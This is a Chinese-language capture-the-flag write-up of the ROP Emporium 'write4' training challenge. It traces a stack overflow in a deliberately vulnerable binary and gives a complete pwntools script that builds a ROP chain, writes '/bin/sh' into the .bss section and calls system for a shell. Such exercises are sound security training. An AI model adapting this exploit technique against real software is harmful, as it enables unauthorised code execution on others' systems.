---
title: ROP Emporium の write4
date: 2020-06-02 12:06:01
categories:
- WriteUPs
- ROP Emporium
tags:
- PWN
- ROP
- Stack
---
## Introduction

[ROP Emporium](https://ropemporium.com)训练3：write4的解析。

<!-- more -->

## write432

### Step 1

程序正常运行截图：

![](/img/write4/write4-1.png)

checksec：32位程序，只开启了DEP保护,依然是用ROP Chain解决DEP保护的问题

![](/img/write4/write4-2.png)

### Step 2

把程序丢到hopper中看下，发现依然有pwnme函数，依然是fgets函数存在溢出漏洞。

![](/img/write4/write4-3.png)

同时程序中程序中依然存在system函数，可以执行系统命令：

![](/img/write4/write4-4.png)

以及一个usefulFunction函数：

![](/img/write4/write4-5.png)

但是函数只能看到有什么文件而无法看到flag.txt文件里有什么内容。

有了system函数我们就想着去找’/bin/sh’或者’/bin/cat flag.txt’字符串：

![](/img/write4/write4-6.png)

意料之中的啥也没有，那么在结合题目给我们的提示，可能我们得自己往内存中写入‘bin/sh’字符串。

### Step 3

找一下系统中的段，把数据写入.data或者.bss的段中去：

![](/img/write4/write4-7.png)

看了下这两个段发现均无任何数据且均具有写权限所以写到任意那个地方都是可以的，只要内存区域的大小够即可：

![](/img/write4/write4-8.png)

下一步就要考虑怎么写数据，在程序的函数中发现这样一个有趣的函数：

![](/img/write4/write4-9.png)

通过这个函数我们可以向内存中写入数据，但是我们还需要一个指令段控制edi和ebp，所以通过ROPgadget找一下：

![](/img/write4/write4-10.png)

### Step 4

整个ROP Chain的构造及运行示意图如下：

![](/img/write4/write4-11.png)

最后就是构造payload了，32位程序还有一点需要注意就是每次只能写入dword也就是4字节，所以’/bin/sh’需要分成两次写入，下面直接给出EXP脚本：

```Python
* # coding:utf-8
* from pwn import *
* 
* sh = process('./write432')
* elf = ELF('./write432')
* 
* bss_addr = 0x0804a040 #.bss段开始的地址
* sys_addr = elf.symbols['system'] #system函数入口地址
* mov_addr = 0x08048670 #把字符串写入.bss段的sub_8048670函数入口地址即mov dword [edi], ebp ; ret
* pop_addr = 0x080486da #控制edi和ebp指令段地址即pop edi ; pop ebp ; ret
* 
* payload = 'a' * (0x28 + 0x4) #padding
* payload += p32(pop_addr) + p32(bss_addr) + '/bin' + p32(mov_addr) #第一次写入
* payload += p32(pop_addr) + p32(bss_addr+ 4) + '/sh\0' + p32(mov_addr) #第二次写入，注意截断符(‘\0’或者‘\x00’都可以）
* payload += p32(sys_addr) + p32(0xdeadbeef) + p32(bss_addr) #调用system函数执行/bin/sh
* 
* sh.recvuntil('>')
* sh.sendline(payload)
* 
* sh.interactive()
* sh.close()
```

EXP运行截图：

![](/img/write4/write4-12.png)

## write4

64位程序和32位程序基本一致，只不过在传入数据的时候可以一次性传入’/bin/sh\0’，这样更加简单。

其他的部分和32位程序毫无差别，有兴趣可自行尝试，这里就不详细赘述了。

## P.S.

也许会纳闷在程序中有一个usefulFunction的函数，执行的是‘/bin/ls’的命令。那么既然本题我们可以向内存中写入字符串，那么是否可以修改这个函数的命令实现get shell呢。

实际是不可以的，因为在程序中我们可以看到这个函数中的参数放在.rodata这个段，顾名思义这是read only的数据段，是没有写入权限的，所以无法通过修改usefulFunction函数的参数实现。

![](/img/write4/write4-13.png)

![](/img/write4/write4-14.png)
